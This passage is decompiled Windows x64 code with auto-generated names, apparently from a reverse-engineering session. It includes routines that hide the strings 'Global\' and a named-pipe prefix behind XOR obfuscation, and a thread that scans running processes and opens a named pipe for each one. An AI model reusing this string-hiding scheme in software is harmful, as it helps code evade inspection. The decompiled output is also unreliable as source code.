//----- (00000001400783D0) ----------------------------------------------------
void *__fastcall sub_1400783D0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400782B0(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140078400) ----------------------------------------------------
char __fastcall sub_140078400(__int64 a1)
{
  __int64 v1; // rsi
  volatile signed __int32 *v3; // rax
  void *v4; // rbx
  HANDLE v5; // rax
  void (__fastcall ***v6)(void *, _QWORD); // rbx
  HANDLE v7; // rax
  bool v8; // bl
  BOOL (__fastcall *v9)(__int64); // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  LPVOID v11; // [rsp+50h] [rbp+8h]
  LPVOID lpMem; // [rsp+58h] [rbp+10h]

  v1 = a1;
  if ( (unsigned __int8)sub_1400362F0((__int64 *)(a1 + 120)) )
    return 1;
  *(_QWORD *)(v1 + 8) = CreateEventA(0i64, 0, 0, 0i64);
  *(_QWORD *)(v1 + 16) = CreateEventA(0i64, 0, 0, 0i64);
  v9 = sub_140078D10;
  v10 = v1;
  sub_140078090((char **)&v11, &v9);
  sub_14001DAE0(&v11);
  sub_140018FB0((volatile signed __int32 **)(v1 + 120), (volatile signed __int32 **)&v11);
  v3 = (volatile signed __int32 *)v11;
  lpMem = v11;
  v11 = 0i64;
  if ( lpMem && !_InterlockedDecrement(v3 + 2) )
  {
    v4 = lpMem;
    (**(void (__fastcall ***)(LPVOID, _QWORD))lpMem)(lpMem, 0i64);
    v5 = GetProcessHeap();
    HeapFree(v5, 0, v4);
  }
  sub_1400366B0((volatile signed __int32 **)&v11);
  v6 = (void (__fastcall ***)(void *, _QWORD))v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement((volatile signed __int32 *)v11 + 2) )
    {
      (**v6)(v6, 0i64);
      v7 = GetProcessHeap();
      HeapFree(v7, 0, v6);
    }
  }
  sub_140036A80();
  v8 = WaitForSingleObject(*(HANDLE *)(v1 + 16), 0x7D0u) == 0;
  CloseHandle(*(HANDLE *)(v1 + 16));
  *(_QWORD *)(v1 + 16) = 0i64;
  return v8;
}

//----- (0000000140078550) ----------------------------------------------------
_BOOL8 __fastcall sub_140078550(__int64 a1)
{
  return sub_1400362F0((__int64 *)(a1 + 120));
}

//----- (0000000140078560) ----------------------------------------------------
bool __fastcall sub_140078560(__int64 a1)
{
  __int64 v1; // rbp
  signed __int64 v3; // rsi
  __int64 *v4; // rdi
  __int64 *v5; // rbx
  __int64 **v6; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  _QWORD *v9; // rdi
  _QWORD *k; // rbx
  volatile signed __int32 *v11; // rbx

  v1 = a1;
  if ( !(unsigned __int8)sub_1400362F0((__int64 *)(a1 + 120)) )
    return 1;
  SetEvent(*(HANDLE *)(v1 + 8));
  sub_14001D1F0((__int64 *)(v1 + 120));
  CloseHandle(*(HANDLE *)(v1 + 8));
  v3 = v1 + 128;
  *(_QWORD *)(v1 + 8) = 0i64;
  v4 = *(__int64 **)(v1 + 128);
  v5 = (__int64 *)*v4;
  while ( v5 != v4 )
  {
    CloseHandle((HANDLE)v5[5]);
    if ( !*((_BYTE *)v5 + 25) )
    {
      v6 = (__int64 **)v5[2];
      if ( *((_BYTE *)v6 + 25) )
      {
        for ( i = (__int64 *)v5[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
        {
          if ( v5 != (__int64 *)i[2] )
            break;
          v5 = i;
        }
        v5 = i;
      }
      else
      {
        v5 = (__int64 *)v5[2];
        for ( j = *v6; !*((_BYTE *)j + 25); j = (__int64 *)*j )
          v5 = j;
      }
    }
  }
  v9 = *(_QWORD **)(*(_QWORD *)v3 + 8i64);
  for ( k = v9; !*((_BYTE *)k + 25); v9 = k )
  {
    sub_1400792D0(v1 + 128, (void *)k[2]);
    k = (_QWORD *)*k;
    operator delete(v9);
  }
  *(_QWORD *)(*(_QWORD *)v3 + 8i64) = *(_QWORD *)v3;
  **(_QWORD **)v3 = *(_QWORD *)v3;
  *(_QWORD *)(*(_QWORD *)v3 + 16i64) = *(_QWORD *)v3;
  *(_QWORD *)(v1 + 136) = 0i64;
  *(_QWORD *)(v1 + 104) = 0i64;
  v11 = *(volatile signed __int32 **)(v1 + 112);
  *(_QWORD *)(v1 + 112) = 0i64;
  if ( v11 && !_InterlockedDecrement(v11 + 2) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v11 + 8i64))(v11);
    if ( !_InterlockedDecrement(v11 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v11 + 16i64))(v11);
  }
  return (unsigned __int8)sub_1400362F0((__int64 *)(v1 + 120)) == 0;
}

//----- (00000001400786E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400786E0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBE48;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBE48 & 1 )
  {
    v5 = byte_1400DBE44;
  }
  else
  {
    v4 = 69069 * dword_1400DBE3C + 1234567;
    v1 = dword_1400DBE48 | 1;
    dword_1400DBE3C = v4;
    dword_1400DBE48 |= 1u;
    dword_1400DBE34 = HIWORD(dword_1400DBE34) + 36969 * (unsigned __int16)dword_1400DBE34;
    LOBYTE(v4) = (BYTE2(dword_1400DBE40) + 80 * dword_1400DBE40) ^ v4;
    dword_1400DBE40 = HIWORD(dword_1400DBE40) + 18000 * (unsigned __int16)dword_1400DBE40;
    v5 = (((unsigned int)dword_1400DBE38 >> 13) ^ 32 * dword_1400DBE38 ^ dword_1400DBE38) + v4;
    dword_1400DBE38 ^= ((unsigned int)dword_1400DBE38 >> 13) ^ 32 * (dword_1400DBE38 ^ (dword_1400DBE38 << 12));
    byte_1400DBE44 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBE48 = v1 | 2;
    byte_1400DBE4C[0] = v5 ^ 0x47;
    byte_1400DBE4D = (v5 - 1) ^ 0x6C;
    byte_1400DBE4E = (v5 - 2) ^ 0x6F;
    byte_1400DBE4F = (v5 - 3) ^ 0x62;
    byte_1400DBE50 = (v5 - 4) ^ 0x61;
    byte_1400DBE51 = (v5 - 5) ^ 0x6C;
    byte_1400DBE52 = (v5 - 6) ^ 0x5C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DBE44;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBE4C[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DBE34: using guessed type int dword_1400DBE34;
// 1400DBE38: using guessed type int dword_1400DBE38;
// 1400DBE3C: using guessed type int dword_1400DBE3C;
// 1400DBE40: using guessed type int dword_1400DBE40;
// 1400DBE44: using guessed type char byte_1400DBE44;
// 1400DBE48: using guessed type int dword_1400DBE48;
// 1400DBE4D: using guessed type char byte_1400DBE4D;
// 1400DBE4E: using guessed type char byte_1400DBE4E;
// 1400DBE4F: using guessed type char byte_1400DBE4F;
// 1400DBE50: using guessed type char byte_1400DBE50;
// 1400DBE51: using guessed type char byte_1400DBE51;
// 1400DBE52: using guessed type char byte_1400DBE52;

//----- (00000001400788B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400788B0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBE54;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBE54 & 1 )
  {
    v5 = byte_1400DBE53;
  }
  else
  {
    v4 = 69069 * dword_1400DBE3C + 1234567;
    v1 = dword_1400DBE54 | 1;
    dword_1400DBE3C = v4;
    dword_1400DBE54 |= 1u;
    dword_1400DBE34 = HIWORD(dword_1400DBE34) + 36969 * (unsigned __int16)dword_1400DBE34;
    LOBYTE(v4) = (BYTE2(dword_1400DBE40) + 80 * dword_1400DBE40) ^ v4;
    dword_1400DBE40 = HIWORD(dword_1400DBE40) + 18000 * (unsigned __int16)dword_1400DBE40;
    v5 = (((unsigned int)dword_1400DBE38 >> 13) ^ 32 * dword_1400DBE38 ^ dword_1400DBE38) + v4;
    dword_1400DBE38 ^= ((unsigned int)dword_1400DBE38 >> 13) ^ 32 * (dword_1400DBE38 ^ (dword_1400DBE38 << 12));
    byte_1400DBE53 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBE54 = v1 | 2;
    byte_1400DBE58[0] = v5 ^ 0x5C;
    byte_1400DBE59 = (v5 - 1) ^ 0x5C;
    byte_1400DBE5A = (v5 - 2) ^ 0x2E;
    byte_1400DBE5B = (v5 - 3) ^ 0x5C;
    byte_1400DBE5C = (v5 - 4) ^ 0x70;
    byte_1400DBE5D = (v5 - 5) ^ 0x69;
    byte_1400DBE5E = (v5 - 6) ^ 0x70;
    byte_1400DBE5F = (v5 - 7) ^ 0x65;
    byte_1400DBE60 = (v5 - 8) ^ 0x5C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DBE53;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBE58[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DBE34: using guessed type int dword_1400DBE34;
// 1400DBE38: using guessed type int dword_1400DBE38;
// 1400DBE3C: using guessed type int dword_1400DBE3C;
// 1400DBE40: using guessed type int dword_1400DBE40;
// 1400DBE53: using guessed type char byte_1400DBE53;
// 1400DBE54: using guessed type int dword_1400DBE54;
// 1400DBE59: using guessed type char byte_1400DBE59;
// 1400DBE5A: using guessed type char byte_1400DBE5A;
// 1400DBE5B: using guessed type char byte_1400DBE5B;
// 1400DBE5C: using guessed type char byte_1400DBE5C;
// 1400DBE5D: using guessed type char byte_1400DBE5D;
// 1400DBE5E: using guessed type char byte_1400DBE5E;
// 1400DBE5F: using guessed type char byte_1400DBE5F;
// 1400DBE60: using guessed type char byte_1400DBE60;

//----- (0000000140078D10) ----------------------------------------------------
BOOL __fastcall sub_140078D10(__int64 a1)
{
  __int64 v1; // r13
  int v2; // er12
  const CHAR *v3; // rdi
  struct _SECURITY_ATTRIBUTES *v4; // rax
  signed __int64 v5; // rdi
  int v6; // eax
  unsigned __int64 v7; // r14
  unsigned __int64 v8; // r9
  __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 v11; // r8
  __int64 *v12; // rax
  _QWORD *v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  const CHAR *v16; // rax
  BOOL v17; // ebx
  const CHAR *v18; // rax
  const CHAR *v19; // rbx
  struct _SECURITY_ATTRIBUTES *v20; // rax
  HANDLE v21; // rsi
  unsigned __int64 v22; // rdx
  __int64 v23; // rax
  __int64 v24; // rcx
  __int64 v25; // rbx
  _QWORD *v26; // rax
  int v27; // eax
  void *v28; // rcx
  DWORD v29; // eax
  unsigned int v31; // [rsp+40h] [rbp-C0h]
  __int64 v32; // [rsp+48h] [rbp-B8h]
  HANDLE Handles; // [rsp+50h] [rbp-B0h]
  HANDLE hObject; // [rsp+58h] [rbp-A8h]
  int v35[2]; // [rsp+60h] [rbp-A0h]
  __int64 v36; // [rsp+68h] [rbp-98h]
  __int64 *v37; // [rsp+70h] [rbp-90h]
  __int64 v38; // [rsp+78h] [rbp-88h]
  signed int *v39; // [rsp+80h] [rbp-80h]
  void *v40; // [rsp+90h] [rbp-70h]
  __int64 (__fastcall **v41)(void *); // [rsp+98h] [rbp-68h]
  char v42; // [rsp+A0h] [rbp-60h]
  void **v43; // [rsp+B0h] [rbp-50h]
  _QWORD *v44; // [rsp+B8h] [rbp-48h]
  _QWORD *v45; // [rsp+D8h] [rbp-28h]
  _DWORD *v46; // [rsp+F0h] [rbp-10h]
  __int64 v47; // [rsp+100h] [rbp+0h]
  int v48; // [rsp+108h] [rbp+8h]
  char v49; // [rsp+118h] [rbp+18h]
  __int64 v50; // [rsp+180h] [rbp+80h]
  __int64 v51; // [rsp+188h] [rbp+88h]
  void *Src; // [rsp+190h] [rbp+90h]
  unsigned __int64 v53; // [rsp+1A8h] [rbp+A8h]
  int Dst[1026]; // [rsp+1B0h] [rbp+B0h]

  v51 = -2i64;
  v1 = a1;
  v2 = 0;
  LODWORD(v32) = 0;
  Handles = 0i64;
  hObject = 0i64;
  Handles = *(HANDLE *)(a1 + 8);
  if ( *(_QWORD *)(a1 + 88) < 0x10ui64 )
    v3 = (const CHAR *)(a1 + 64);
  else
    v3 = *(const CHAR **)(a1 + 64);
  v4 = (struct _SECURITY_ATTRIBUTES *)sub_140079840();
  hObject = CreateEventA(v4, 1, 0, v3);
  if ( hObject )
    sub_140079BF0((LPSTR)(v1 + 64));
  while ( 1 )
  {
    memset(Dst, 0, 0x1000ui64);
    v31 = 0;
    if ( (unsigned int)EnumProcesses(Dst, 4096i64, &v31) == 1 )
    {
      v5 = v1 + 96;
      v50 = v1 + 96;
      v6 = Mtx_lock(v1 + 96);
      if ( v6 )
        std::_Throw_C_error(v6);
      v7 = 0i64;
      if ( v31 & 0xFFFFFFFC )
      {
        do
        {
          if ( *(_BYTE *)(v1 + 24) || Dst[v7] != GetCurrentProcessId() )
          {
            v8 = (unsigned int)Dst[v7];
            v9 = *(_QWORD *)(v1 + 128);
            v10 = *(_QWORD *)(v9 + 8);
            v11 = *(_QWORD *)(v1 + 128);
            while ( !*(_BYTE *)(v10 + 25) )
            {
              if ( *(_QWORD *)(v10 + 32) >= v8 )
              {
                v11 = v10;
                v10 = *(_QWORD *)v10;
              }
              else
              {
                v10 = *(_QWORD *)(v10 + 16);
              }
            }
            if ( v11 == v9 || v8 < *(_QWORD *)(v11 + 32) )
            {
              v38 = *(_QWORD *)(v1 + 128);
              v12 = &v38;
            }
            else
            {
              v36 = v11;
              v12 = &v36;
            }
            if ( *v12 == v9 )
            {
              v39 = (signed int *)&unk_1400A6BB0;
              v40 = &unk_1400A6BB8;
              std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(&v49);
              v2 |= 1u;
              LODWORD(v32) = v2;
              std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(
                &v39,
                &v41,
                0i64);
              *(signed int **)((char *)&v39 + v39[1]) = (signed int *)&off_1400A6BA8;
              *(_DWORD *)((char *)&v38 + v39[1] + 4) = v39[1] - 152;
              std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(&v41);
              v41 = &off_1400A6430;
              v47 = 0i64;
              v48 = 0;
              v13 = sub_1400788B0(&Src);
              v14 = sub_140022840(&v40, v13);
              v15 = sub_140022840(v14, v1 + 32);
              std::basic_ostream<char,std::char_traits<char>>::operator<<(v15, (unsigned int)Dst[v7]);
              if ( v53 >= 0x10 )
                operator delete(Src);
              v16 = (const CHAR *)sub_14002A070((__int64)&v39, &Src);
              if ( *((_QWORD *)v16 + 3) >= 0x10ui64 )
                v16 = *(const CHAR **)v16;
              v17 = WaitNamedPipeA(v16, 0xAu);
              if ( v53 >= 0x10 )
                operator delete(Src);
              if ( v17 )
              {
                v18 = (const CHAR *)sub_14002A070((__int64)&v39, &Src);
                v19 = v18;
                if ( *((_QWORD *)v18 + 3) >= 0x10ui64 )
                  v19 = *(const CHAR **)v18;
                v20 = (struct _SECURITY_ATTRIBUTES *)sub_140079840();
                v21 = CreateFileA(v19, 0x120116u, 0, v20, 3u, 0x80u, 0i64);
                if ( v53 >= 0x10 )
                  operator delete(Src);
                if ( v21 != (HANDLE)-1i64 )
                {
                  v22 = (unsigned int)Dst[v7];
                  v32 = (unsigned int)Dst[v7];
                  v23 = *(_QWORD *)(v1 + 128);
                  v24 = *(_QWORD *)(v23 + 8);
                  v25 = *(_QWORD *)(v1 + 128);
                  while ( !*(_BYTE *)(v24 + 25) )
                  {
                    if ( *(_QWORD *)(v24 + 32) >= v22 )
                    {
                      v25 = v24;
                      v24 = *(_QWORD *)v24;
                    }
                    else
                    {
                      v24 = *(_QWORD *)(v24 + 16);
                    }
                  }
                  if ( v25 == v23 || v22 < *(_QWORD *)(v25 + 32) )
                  {
                    v37 = &v32;
                    v26 = sub_140077920((_QWORD *)(v1 + 128), (__int64)&unk_1400DBE31, &v37);
                    sub_140077C20((void *)(v1 + 128), v35, v25, v26 + 4, (__int64)v26);
                    v25 = *(_QWORD *)v35;
                  }
                  *(_QWORD *)(v25 + 40) = v21;
                }
              }
              *(signed int **)((char *)&v39 + v39[1]) = (signed int *)&off_1400A6BA8;
              *(_DWORD *)((char *)&v38 + v39[1] + 4) = v39[1] - 152;
              v41 = &off_1400A6430;
              if ( v48 & 1 )
                operator delete(*v43);
              std::basic_streambuf<char,std::char_traits<char>>::setg(&v41, 0i64, 0i64, 0i64);
              *v44 = 0i64;
              *v45 = 0i64;
              *v46 = 0;
              v47 = 0i64;
              v48 &= 0xFFFFFFFE;
              std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(&v41);
              std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(&v42);
              std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(&v49);
            }
          }
          ++v7;
        }
        while ( v7 < (unsigned __int64)v31 >> 2 );
        v5 = v1 + 96;
      }
      v27 = Mtx_unlock(v5);
      if ( v27 )
        std::_Throw_C_error(v27);
    }
    v28 = *(void **)(v1 + 16);
    if ( v28 )
      SetEvent(v28);
    if ( !hObject )
      break;
    v29 = WaitForMultipleObjects(2u, &Handles, 0, 0xFFFFFFFF);
    if ( v29 >= 0x80 )
    {
      if ( v29 == 258 || v29 == -1 )
        break;
    }
    else if ( v29 == 0 )
    {
      break;
    }
  }
  Sleep(1u);
  return CloseHandle(hObject);
}
// 140022840: using guessed type __int64 __fastcall sub_140022840(_QWORD, _QWORD);
// 140086F10: using guessed type __int64 __fastcall EnumProcesses(_QWORD, _QWORD, _QWORD);
// 1400A1470: using guessed type __int64 __fastcall std::basic_ostream<char,std::char_traits<char>>::operator<<(_QWORD, _QWORD);
// 1400A14F8: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A15C8: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::~basic_iostream<char,std::char_traits<char>>(_QWORD);
// 1400A15D0: using guessed type __int64 __fastcall std::basic_iostream<char,std::char_traits<char>>::basic_iostream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A1690: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A16A0: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::setg(_QWORD, _QWORD, _QWORD, _QWORD);
// 1400A16B0: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A6430: using guessed type __int64 (__fastcall *off_1400A6430)(void *);
// 1400A6BA8: using guessed type __int64 (__fastcall *off_1400A6BA8)();
// 140078D10: using guessed type int Dst[1026];

//----- (0000000140079220) ----------------------------------------------------
void sub_140079220()
{
  _QWORD *v0; // rax

  v0 = operator new(0x30ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140079270) ----------------------------------------------------
_QWORD *__fastcall sub_140079270(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x30ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400792D0) ----------------------------------------------------
void __fastcall sub_1400792D0(__int64 a1, void *a2)
{
  void *v2; // rdi
  __int64 v3; // rsi
  _QWORD *v4; // rbx

  v2 = a2;
  v3 = a1;
  v4 = a2;
  if ( !*((_BYTE *)a2 + 25) )
  {
    do
    {
      sub_1400792D0(v3, v4[2]);
      v4 = (_QWORD *)*v4;
      operator delete(v2);
      v2 = v4;
    }
    while ( !*((_BYTE *)v4 + 25) );
  }
}

//----- (0000000140079320) ----------------------------------------------------
__int64 __fastcall sub_140079320(_QWORD *a1)
{
  _QWORD *v1; // rdi
  _QWORD *v2; // rsi
  _QWORD *i; // rbx
  __int64 result; // rax

  v1 = a1;
  v2 = *(_QWORD **)(*a1 + 8i64);
  for ( i = v2; !*((_BYTE *)i + 25); v2 = i )
  {
    sub_1400792D0((__int64)v1, (void *)i[2]);
    i = (_QWORD *)*i;
    operator delete(v2);
  }
  *(_QWORD *)(*v1 + 8i64) = *v1;
  *(_QWORD *)*v1 = *v1;
  result = *v1;
  *(_QWORD *)(result + 16) = result;
  v1[1] = 0i64;
  return result;
}

//----- (0000000140079390) ----------------------------------------------------
__int64 *__fastcall sub_140079390(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rdi
  __int64 **v5; // rbx
  __int64 *result; // rax
  __int64 v7; // rax
  __int64 v8; // rdx
  __int64 j; // rcx
  __int64 i; // rcx
  char v11; // [rsp+30h] [rbp+8h]
  __int64 v12; // [rsp+40h] [rbp+18h]
  __int64 v13; // [rsp+48h] [rbp+20h]

  v13 = a4;
  v12 = a3;
  v4 = a2;
  v5 = a1;
  if ( a3 != **a1 || (__int64 *)a4 != *a1 )
  {
    if ( a3 != a4 )
    {
      do
      {
        v7 = a3;
        if ( !*(_BYTE *)(a3 + 25) )
        {
          v8 = *(_QWORD *)(a3 + 16);
          if ( *(_BYTE *)(v8 + 25) )
          {
            for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( a3 != *(_QWORD *)(i + 16) )
                break;
              v12 = i;
              a3 = i;
            }
            v12 = i;
          }
          else
          {
            for ( j = *(_QWORD *)v8; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
              v8 = j;
            v12 = v8;
          }
        }
        sub_140079470(v5, (__int64 *)&v11, v7);
        a3 = v12;
      }
      while ( v12 != v13 );
    }
    *v4 = a3;
    result = v4;
  }
  else
  {
    sub_140079320(a1);
    result = v4;
    *v4 = **v5;
  }
  return result;
}

//----- (0000000140079470) ----------------------------------------------------
__int64 *__fastcall sub_140079470(_QWORD *a1, __int64 *a2, __int64 a3)
{
  __int64 *v3; // r15
  __int64 *v4; // r14
  _QWORD *v5; // rsi
  __int64 v6; // rax
  __int64 j; // rax
  __int64 i; // rax
  __int64 v9; // rdi
  __int64 v10; // rbx
  __int64 k; // rcx
  __int64 v12; // rax
  _QWORD *v13; // rdx
  __int64 v14; // rax
  __int64 l; // rcx
  __int64 *v16; // rax
  char v17; // cl
  _BYTE *v18; // rcx
  __int64 *v19; // rcx
  __int64 **v20; // rax
  _BYTE *v21; // rcx
  __int64 v22; // rax
  _QWORD *v23; // rax
  __int64 v24; // rax
  __int64 v26; // [rsp+50h] [rbp+18h]

  v26 = a3;
  v3 = a2;
  v4 = (__int64 *)a3;
  v5 = a1;
  if ( !*(_BYTE *)(a3 + 25) )
  {
    v6 = *(_QWORD *)(a3 + 16);
    if ( *(_BYTE *)(v6 + 25) )
    {
      for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( a3 != *(_QWORD *)(i + 16) )
          break;
        a3 = i;
      }
      a3 = i;
      v26 = i;
    }
    else
    {
      a3 = *(_QWORD *)(a3 + 16);
      for ( j = *(_QWORD *)v6; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
        a3 = j;
      v26 = a3;
    }
  }
  if ( *(_BYTE *)(*v4 + 25) )
  {
    v9 = v4[2];
LABEL_15:
    v10 = v4[1];
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    if ( *(__int64 **)(*a1 + 8i64) == v4 )
    {
      *(_QWORD *)(*a1 + 8i64) = v9;
    }
    else if ( *(__int64 **)v10 == v4 )
    {
      *(_QWORD *)v10 = v9;
    }
    else
    {
      *(_QWORD *)(v10 + 16) = v9;
    }
    if ( *(__int64 **)*a1 == v4 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        k = v10;
      }
      else
      {
        v12 = *(_QWORD *)v9;
        for ( k = v9; !*(_BYTE *)(v12 + 25); v12 = *(_QWORD *)v12 )
          k = v12;
      }
      *(_QWORD *)*v5 = k;
    }
    v13 = (_QWORD *)*v5;
    if ( *(__int64 **)(*v5 + 16i64) == v4 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        v13[2] = v10;
      }
      else
      {
        v14 = *(_QWORD *)(v9 + 16);
        for ( l = v9; !*(_BYTE *)(v14 + 25); v14 = *(_QWORD *)(v14 + 16) )
          l = v14;
        v13[2] = l;
      }
    }
    goto LABEL_45;
  }
  if ( *(_BYTE *)(v4[2] + 25) )
  {
    v9 = *v4;
    goto LABEL_15;
  }
  v9 = *(_QWORD *)(a3 + 16);
  if ( (__int64 *)a3 == v4 )
    goto LABEL_15;
  *(_QWORD *)(*v4 + 8) = a3;
  *(_QWORD *)a3 = *v4;
  if ( a3 == v4[2] )
  {
    v10 = a3;
  }
  else
  {
    v10 = *(_QWORD *)(a3 + 8);
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    *(_QWORD *)v10 = v9;
    *(_QWORD *)(a3 + 16) = v4[2];
    *(_QWORD *)(v4[2] + 8) = a3;
  }
  if ( *(__int64 **)(*a1 + 8i64) == v4 )
  {
    *(_QWORD *)(*a1 + 8i64) = a3;
  }
  else
  {
    v16 = (__int64 *)v4[1];
    if ( (__int64 *)*v16 == v4 )
      *v16 = a3;
    else
      v16[2] = a3;
  }
  *(_QWORD *)(a3 + 8) = v4[1];
  v17 = *(_BYTE *)(a3 + 24);
  *(_BYTE *)(a3 + 24) = *((_BYTE *)v4 + 24);
  *((_BYTE *)v4 + 24) = v17;
LABEL_45:
  if ( *((_BYTE *)v4 + 24) == 1 )
  {
    for ( ; v9 != *(_QWORD *)(*v5 + 8i64); v10 = *(_QWORD *)(v10 + 8) )
    {
      if ( *(_BYTE *)(v9 + 24) != 1 )
        break;
      v18 = *(_BYTE **)v10;
      if ( v9 == *(_QWORD *)v10 )
      {
        v18 = *(_BYTE **)(v10 + 16);
        if ( !v18[24] )
        {
          v18[24] = 1;
          v19 = *(__int64 **)(v10 + 16);
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)(v10 + 16) = *v19;
          if ( !*(_BYTE *)(*v19 + 25) )
            *(_QWORD *)(*v19 + 8) = v10;
          v19[1] = *(_QWORD *)(v10 + 8);
          if ( v10 == *(_QWORD *)(*v5 + 8i64) )
          {
            *(_QWORD *)(*v5 + 8i64) = v19;
          }
          else
          {
            v20 = *(__int64 ***)(v10 + 8);
            if ( (__int64 *)v10 == *v20 )
              *v20 = v19;
            else
              v20[2] = v19;
          }
          *v19 = v10;
          *(_QWORD *)(v10 + 8) = v19;
          v18 = *(_BYTE **)(v10 + 16);
        }
        if ( v18[25] )
          goto LABEL_77;
